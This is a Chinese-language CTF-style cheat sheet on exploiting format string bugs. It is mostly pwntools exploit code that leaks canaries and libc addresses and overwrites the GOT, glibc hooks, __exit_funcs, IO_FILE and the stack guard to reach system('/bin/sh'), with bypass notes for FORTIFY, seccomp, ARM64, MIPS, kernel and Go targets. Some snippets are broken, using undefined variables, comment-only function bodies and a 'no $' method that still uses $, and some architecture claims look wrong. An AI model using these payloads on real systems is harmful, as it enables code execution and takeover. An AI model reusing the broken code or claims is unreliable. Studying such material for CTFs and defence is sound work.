# 格式化字符串 (Format String)

## 原理

`printf` 等函数的格式化字符串参数用户可控，攻击者可读取栈上数据、写任意地址，实现信息泄露和任意代码执行。

## 攻击链

### 1. 漏洞识别

```c
// 危险代码
printf(user_input);           // 直接 printf 用户输入
sprintf(buf, user_input);     // sprintf
fprintf(fp, user_input);      // fprintf
syslog(LOG_INFO, user_input); // syslog
```

### 2. 探测

```bash
# 输入 %p %p %p %p %p %p %p %p
# 看输出是否有栈地址
# 输入 AAAA%p%p%p%p
# 看是否有 0x41414141
```

### 3. 确定偏移

```python
from pwn import *

p = process('./pwn')
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
output = p.recv()
# 找到 0x41414141 的位置
# 假设第 6 个 %p 输出 0x41414141，则偏移为 6
```

### 4. 读取栈数据

```python
# 32 位
payload = b'%6$x'  # 读取第 6 个参数
payload = b'%6$s'  # 读取第 6 个参数指向的字符串

# 64 位
payload = b'%6$lx'
payload = b'%6$s'
```

### 5. 读取任意地址

```python
# 32 位
addr = 0x08048000
payload = p32(addr) + b'%7$s'  # 第 7 个参数是 addr

# 64 位
addr = 0x404000
payload = p64(addr) + b'%8$s'
# 注意对齐
```

### 6. 写任意地址

```python
# %n: 写入已输出字符数
# %hn: 写 2 字节
# %hhn: 写 1 字节
# %n: 写 4 字节（32 位）/ 8 字节（64 位）

# 32 位写 0x0804a024 = 0x12345678
target = 0x0804a024
value = 0x12345678

payload = p32(target)     # 写低 2 字节
payload += p32(target + 2)  # 写高 2 字节
payload += b'%' + str((value & 0xffff) - 8).encode() + b'c%6$hn'
payload += b'%' + str(((value >> 16) & 0xffff) - (value & 0xffff)).encode() + b'c%7$hn'
```

### 7. pwntools fmtstr

```python
from pwn import *

# 自动生成 payload
payload = fmtstr_payload(6, {0x0804a024: 0x12345678})
# 6 是偏移
# {addr: value} 是要写的地址和值

p.sendline(payload)
```

## 利用场景

### 1. 泄露 Canary

```python
# 假设 Canary 在第 7 个参数
payload = b'%7$p'
p.sendline(payload)
canary = int(p.recv(), 16)
```

### 2. 泄露 libc 地址

```python
# 泄露 __libc_start_main 的返回地址
# 假设在第 9 个参数
payload = b'%9$p'
p.sendline(payload)
libc_addr = int(p.recv(), 16)
libc_base = libc_addr - libc.symbols['__libc_start_main'] - 240
```

### 3. 泄露栈地址

```python
# 泄露栈上保存的栈地址
payload = b'%p.%p.%p.%p.%p.%p.%p.%p'
# 找到栈地址
```

### 4. 覆盖 GOT 表

```python
# 将 printf 的 GOT 改为 system
from pwn import *

elf = ELF('./pwn')
printf_got = elf.got['printf']
system_addr = 0x08048450

payload = fmtstr_payload(6, {printf_got: system_addr})
p.sendline(payload)
p.sendline(b'/bin/sh')
```

### 5. 覆盖返回地址

```python
# 覆盖栈上的返回地址
ret_addr = 0xffffd024  # 栈上返回地址位置
target = 0x08048500    # 想跳转的地址

payload = fmtstr_payload(6, {ret_addr: target})
```

### 6. 覆盖 __malloc_hook

```python
# glibc < 2.34
# 触发 malloc 错误时调用 __malloc_hook
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = 0x4527a

payload = fmtstr_payload(6, {malloc_hook: one_gadget})
# 然后触发 malloc 错误
p.sendline(b'%100000c')  # 触发 malloc
```

### 7. 覆盖 __free_hook

```python
# glibc < 2.34
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']

payload = fmtstr_payload(6, {free_hook: system_addr})
p.sendline(payload)
p.sendline(b'/bin/sh')  # 触发 free
```

### 8. 覆盖 __exit_funcs

```python
# glibc 2.34+
# 通过覆盖 __exit_funcs 实现 RCE
```

## 绕过技巧

### 1. 长度限制

```python
# 使用 $hn 分多次写
# 使用短地址
# 使用栈迁移
```

### 2. 过滤特殊字符

```python
# 如果过滤 %，无法利用
# 如果过滤 $，可以用 %c%c%c...%n
# 如果过滤 n，无法写
```

### 3. 无回显

```python
# 盲格式化字符串
# 通过 %n 写入
# 通过侧信道（时间、错误）
```

### 4. 多次调用

```python
# 如果只能调用一次
# 用 fmtstr_payload 一次写多个地址
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 格式化字符串利用

```python
# glibc 2.34+ 移除 hooks，格式化字符串需转向新的利用目标
# 目标：__exit_funcs / IO_FILE / TLS 中的数据

from pwn import *

context.arch = 'amd64'
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# === 方案 1：覆盖 __exit_funcs ===
# __exit_funcs 指向 exit_function_list
# 修改为伪造的 list，exit() 时执行任意函数

# 先泄露 libc
p.sendline(b'%7$p')
libc_leak = int(p.recv(), 16)
libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
log.success(f"libc base: {hex(libc_base)}")

# 覆盖 __exit_funcs 为 system
system_addr = libc_base + libc.symbols['system']
exit_funcs = libc_base + libc.symbols['__exit_funcs']

payload = fmtstr_payload(6, {exit_funcs: system_addr})
p.sendline(payload)

# 触发 exit，system 被调用
# 注意：需要在 exit 之前将参数布置好
# 或者覆盖为 one_gadget

# === 方案 2：覆盖 _IO_list_all 进行 FSOP ===
io_list_all = libc_base + libc.symbols['_IO_list_all']
# 构造 fake IO_FILE，覆盖 _IO_list_all 指向 fake
payload2 = fmtstr_payload(6, {io_list_all: fake_file_addr})
p.sendline(payload2)

# === 方案 3：覆盖 TLS 中的 __stack_chk_guard ===
# 泄露栈地址后，定位 TLS 中的 __stack_chk_guard
# 覆盖为已知值，绕过栈保护
stack_guard_addr = tls_addr + offset_to_stack_guard
known_value = 0x4141414141414141
payload3 = fmtstr_payload(6, {stack_guard_addr: known_value})
```

### 2. FORTIFY_SOURCE 绕过

```python
# GCC FORTIFY_SOURCE 在编译时检测危险的格式化字符串用法
# 某些情况下限制 %n 的使用

from pwn import *

# 绕过方法 1：利用运行时动态生成的格式化字符串
# 如果格式化字符串在栈上且每次运行不同，FORTIFY 无法静态检测

def bypass_fortify_dynamic():
    """当格式化字符串从堆/栈动态生成时"""
    p = process('./pwn')
    # 构造格式化字符串在堆上
    # 通过多次 printf 调用分步写入
    # 使用 %hhn (写 1 字节) 减小 payload 大小
    
    target = 0x404020
    value = 0x41
    
    # 写 1 字节示例
    # payload = p64(target) + b'%c' * (value - 8) + b'%7$hhn'
    # 注意：FORTIFY 会检查 $ 使用
    # 如果 $ 被过滤，改用逐字节位置推测（泄漏栈值推偏移）
    for offset in range(1, 100):
        payload = f'%{offset}$p'.encode()
        p.sendline(payload)
        leak = int(p.recvline().strip(), 16)
        if leak & 0xfff == 0x7ff or leak & 0xffff == 0x7fff:
            print(f'[+] Stack offset: {offset}')

# 绕过方法 2：无 $ 的格式化字符串攻击
def no_dollar_fmtstr(offset):
    """不使用 $ 直接偏移，改用栈上布局"""
    # 在栈上布置目标地址和格式化字符串
    # 通过 %c 跳过不需要的参数
    # 利用 %n 写入
    
    target = 0x404020
    payload = p64(target)
    # 填充到正确的偏移位置，然后 %n 写入
    payload = b'A' * (target_offset - 1) + f'%{target_offset}$hhn'.encode()

# 绕过方法 3：利用 printf 的返回值
def fmtstr_return_value():
    """printf 返回输出的字符数，可作为信息泄露"""
    p = process('./pwn')
    # 发送 %c 输出 1 字节，返回值 = 1
    # 发送 %100c 输出 100 字节，返回值 = 100
    # 可以用于逐字节泄露
    p.sendline(b'%1c%9$hhn')
    # 返回值 = 1，说明第 9 个参数的最低字节是 1
    ret_val = p.recvline()  # 读取返回值
```

### 3. 现代编译器优化绕过

```python
# GCC 13+/Clang 17+ 对格式化字符串的新优化
# - 可能优化栈上布局
# - 可能改变参数传递方式

from pwn import *

def detect_offset_new_compiler():
    """在新编译器下确定格式化字符串偏移"""
    p = process('./pwn')
    
    # 方法 1：使用 AAAA + %p 逐个探测
    probe = b'AAAA'
    for i in range(1, 50):
        probe += f'.%{i}$p'.encode()
    p.sendline(probe)
    result = p.recv()
    
    # 查找 0x41414141 的位置
    for i in range(1, 50):
        val = f'0x41414141'
        if val.encode() in result:
            log.success(f"offset found: {i}")
            return i
    
    # 方法 2：使用 cyclic pattern
    # 构造 cyclic pattern 并查找崩溃偏移
    return None

def exploit_with_modern_compiler():
    """适配新编译器的利用模板"""
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    offset = detect_offset_new_compiler()
    
    # 使用 fmtstr_payload 时指定写入大小
    # 优先使用 %hhn (1字节) 或 %hn (2字节) 减小 payload
    target = elf.got['printf']
    system_addr = libc.symbols['system']
    
    # 分步写入（避免 payload 过大）
    # 第一次：泄露 libc
    payload_leak = f'%{offset}$p'.encode()
    p.sendline(payload_leak)
    leak = int(p.recv(), 16)
    
    # 第二次：覆盖 GOT
    payload_write = fmtstr_payload(offset, {target: system_addr}, write_size='byte')
    p.sendline(payload_write)
    p.sendline(b'/bin/sh')
```

### 4. ARM64 格式化字符串

```python
# ARM64 调用约定：前 8 个参数在 x0-x7 寄存器
# printf 的格式化字符串在 x0，后续参数在 x1-x7 和栈上

from pwn import *

context.arch = 'aarch64'

def arm64_fmtstr_exploit():
    """ARM64 格式化字符串利用"""
    p = process('./pwn')
    
    # ARM64 偏移计算：
    # x0 = 格式化字符串本身（不算参数偏移）
    # x1-x7 = 第 1-7 个参数
    # sp+0 = 第 8 个参数
    # sp+8 = 第 9 个参数
    # ...
    
    # 探测偏移
    p.sendline(b'AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x.%9$x.%10$x')
    result = p.recv()
    
    # ARM64 使用 $ 时偏移从 0 开始（x1 = offset 0）
    # 与 x86 从 1 开始不同
    
    # 泄露示例
    def leak(elf, offset):
        payload = f'%{offset}$p'.encode()
        p.sendline(payload)
        return int(p.recv(), 16)
    
    # 写入示例
    def write_byte(addr, val, offset):
        payload = fmtstr_payload(offset, {addr: val}, write_size='byte')
        p.sendline(payload)
    
    return p
```

### 5. 内核格式化字符串

```python
# 内核中的 printk/vsprintf 等格式化字符串利用
# 通过 /proc 或 sysctl 接口触发

from pwn import *

# 内核格式化字符串泄露内核地址
def kernel_fmtstr_leak():
    """通过格式化字符串泄露内核地址"""
    # 常见泄露目标：
    # 1. 栈上的返回地址 -> 内核基址
    # 2. pt_regs 结构体 -> 用户态寄存器
    # 3. 页表基址
    
    # %p 泄露内核指针（需要注意 KASLR）
    # 在较新内核中 %p 会打印哈希值
    # 内核格式化字符串: 需要 %px 泄漏内核地址
    # 泄漏 stack canary / 内核基地址 / 竞争条件利用

def kernel_fmtstr_write():
    """内核格式化字符串写入"""
    # 通过 %n 在内核中写入
    # 目标：
    # 1. 覆盖 cred 结构体提权
    # 2. 覆盖函数指针
    # 3. 覆盖页表项
    
    # 保护机制：
    # - %n 需要 CAP_SYSLOG (较新内核)
    # - KASLR
    # - SMAP/SMEP
    # ARMv8 PSTATE / PAN 状态检查
    # PAN: 用户态无法直接内核态数据
    # 需要结合其他原语（如 SROP）绕过
```

### 6. 嵌入式设备格式化字符串

```python
# 路由器、摄像头等嵌入式设备上的格式化字符串漏洞
# MIPS/ARM 架构

from pwn import *

# MIPS 格式化字符串
def mips_fmtstr():
    """MIPS 架构格式化字符串"""
    context.arch = 'mips'
    
    # MIPS 调用约定：
    # $a0-$a3 = 前 4 个参数
    # 栈上传递第 5+ 个参数
    # 格式化字符串在 $a0
    
    # 偏移计算：
    # offset 1-4 对应 $a0-$a3（不算）
    # offset 5 对应栈上的第一个参数
    
    # ARM 64 位 (AArch64) 格式化字符串攻击

# ARM 嵌入式设备
def arm_embedded_fmtstr():
    """ARM 32 位嵌入式设备格式化字符串"""
    context.arch = 'arm'
    
    # ARM 调用约定：
    # r0-r3 = 前 4 个参数
    # 栈上传递第 5+ 个参数
    
    # 无 ASLR，格式化字符串偏移固定，直接写返回地址
    payload = f'%{offset}$hhn'.encode() + b'A' * (target - len(payload))
```

### 7. 现代语言格式化字符串

```python
# Rust/Go 等现代语言中的格式化字符串漏洞

# === Rust ===
# Rust 的 format! 宏在编译时检查
# 但运行时动态格式化仍有风险
def rust_fmtstr():
    # Rust format! 宏编译时安全，但运行时动态格式化有风险
    # 危险: format!(user_input) 或 FFI 传递格式化字符串

# === Go ===
# Go 的 fmt.Printf 在编译时检查参数数量
# 但 fmt.Sprintf 的格式化字符串如果来自用户输入则有风险
def go_fmtstr():
    """
    // 危险代码（Go）
    fmt.Printf(userInput)  // 直接使用用户输入
    fmt.Sprintf(userInput)  // 格式化字符串来自用户
    
    // Go 的 fmt 包使用 reflect 调用
    // 可以泄露栈上的指针（ASLR 绕过）
    // %p 可以泄露 goroutine 地址、堆地址
    """
    # Go 二进制的格式化字符串利用
    # Go 的 fmt 包底层使用 reflect，栈上会有大量指针
    p = process('./vuln_go')
    elf = ELF('./vuln_go')
    
    # 泄露栈上的指针（ASLR bypass）
    # Go 的参数通过寄存器和栈传递，%p 可以逐个泄露
    p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')
    p.recvuntil(b'.')
    
    # 解析泄露的指针，识别栈地址、堆地址和 libc 地址
    # Go 的 runtime 地址通常在高位
    leak_ptrs = []
    for _ in range(7):
        data = p.recvuntil(b'.')[:-1]
        leak_ptrs.append(int(data, 16))
    
    # 根据泄露的指针计算基地址
    # Go runtime 布局：goroutine stack, heap, data, bss
    log.info(f"Leaked pointers: {[hex(x) for x in leak_ptrs]}")
    
    # Go 1.21+ 的利用：覆盖 GOT (非 Full RELRO 时)
    # 或利用 goroutine 的栈溢出 + 返回地址覆盖
    # fmt.Fprintf 可以写入任意地址：@ptr@%n
    p.interactive()
```

### 8. 沙箱环境格式化字符串

```python
# seccomp 限制下的格式化字符串利用

from pwn import *

def fmtstr_with_seccomp():
    """seccomp 禁止 execve 时的格式化字符串利用"""
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    # 方法 1：格式化字符串 + ORW
    # 通过格式化字符串泄露地址
    # 构造 ROP 链执行 open/read/write
    
    # 方法 2：格式化字符串覆盖 IO_FILE
    # 构造 fake IO_FILE 执行 ORW
    
    # 方法 3：格式化字符串 + 侧信道
    # seccomp 的 SECCOMP_RET_TRACE 可以 ptrace 交互
    
    # 完整利用流程
    offset = 6  # 假设偏移
    
    # Step 1: 泄露 libc
    p.sendline(f'%{offset + 4}$p'.encode())
    libc_leak = int(p.recv(), 16)
    libc_base = libc_leak - libc.symbols['__libc_start_main'] - 243
    
    # Step 2: 泄露栈地址（用于 _environ）
    p.sendline(f'%{offset + 8}$p'.encode())
    stack_leak = int(p.recv(), 16)
    
    # Step 3: 覆盖 _IO_write_ptr 等控制 IO 流向
    # 实现信息泄露或代码执行
    
    # Step 4: 通过 IO_FILE 实现 ORW
    # open("flag", 0) -> read(fd, buf, size) -> write(1, buf, size)
    
    p.interactive()
```

## 工具推荐

- **pwntools** — fmtstr_payload 自动生成
- **format_string_exploit** — 自动化利用
- **gdb + pwndbg** — 动态调试

## 参考链接

- [ctf-wiki 格式化字符串](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr/)
- [Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [pwntools fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)
